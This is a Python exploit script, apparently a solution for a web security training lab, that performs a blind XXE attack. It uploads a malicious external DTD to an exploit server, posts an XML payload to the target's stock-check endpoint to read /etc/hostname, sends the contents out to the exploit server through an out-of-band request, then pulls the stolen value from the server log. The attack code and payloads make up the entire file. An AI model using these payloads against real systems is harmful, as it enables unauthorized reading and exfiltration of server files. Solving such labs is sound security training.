import requests
import sys
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def store_dtd(url):
    # CREATE EXPLOIT URL
    exploit_url = url

    # CREATE DTD AND SEND REQUEST
    dtd = "<!ENTITY % file SYSTEM \"file:///etc/hostname\"><!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM '{0}/?x=%file;'>\">%eval;%exfiltrate;".format(url)
    params = {
        'urlIsHttps' : 'on',
        'responseFile' : '/xxe.dtd',
        'responseHead' : 'HTTP/1.1 200 OK',
        'Content-Type' : 'text/plain; charset=utf-8',
        'responseBody' : dtd,
        'formAction' : 'STORE'
    }
    r = requests.post(exploit_url, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Something went wrong!")
        sys.exit(-1)
    print("[+] Malicious DTD stored successfully on exploit server")
    return True

def send_payload(url1, url2):
    # CREATE URL
    stock_url = url1 + '/product/stock'
    # CREATE EXPLOIT AND SEND REQUEST
    params = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{0}/xxe.dtd"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'.format(url2)
    r = requests.post(stock_url, data=params, verify=False, proxies=proxies)
    if "XML parsing error" not in r.text and r.status_code != 400:
        print("[-] The exploit did not work!")
        sys.exit(-1)
    print("[+] Payload sent!")
    return True

def retrieve_value(url):
    # CREATE URL AND SEND REQUEST
    log_url = url + '/log'
    r = requests.get(log_url, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Log is not accessible")
        sys.exit(-1)
    # EXTRACT VALUE
    value = re.search(r'\/\?x=([a-z,0-9]+)', r.text).group(1)
    return value

def submit_value(url, value):
    # CREATE PAYLOAD
    submit_url = url + '/submitSolution'
    # SUBMIT VALUE
    params = {
        'answer' : value
    }
    r = requests.post(submit_url, data=params, verify=False, proxies=proxies)
    if r.status_code == 200 and '"correct":true' in r.text:
        return True
    return False

def xxe_attack(url1, url2):
    # STORE MALICIOUS DTD ON EXPLOIT SERVER
    store_dtd(url2)

    # SEND PAYLOAD
    send_payload(url1, url2) 

    # RETRIEVE VALUE
    value = retrieve_value(url2)

    # SUBMIT VALUE
    if not submit_value(url1, value):
        print("[-] Error!")
        sys.exit(-1)
    print("[+] Exploit worked!")
    sys.exit(-1)



def main():
    if len(sys.argv) != 3:
        print("[-] Usage: %s <url1> <url2>" % sys.argv[0])
        print("[-] Example: %s www.example.com www.exploit.com" % sys.argv[0])
        sys.exit(-1)

    url1 = sys.argv[1].strip()
    url2 = sys.argv[2].strip()

    print("[+] Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD")
    print("""[+] This lab has a "Check stock" feature that parses XML input but does not display the result.
    To solve the lab, exfiltrate the contents of the /etc/hostname file.""")

    xxe_attack(url1, url2)

if __name__ == "__main__":
    main()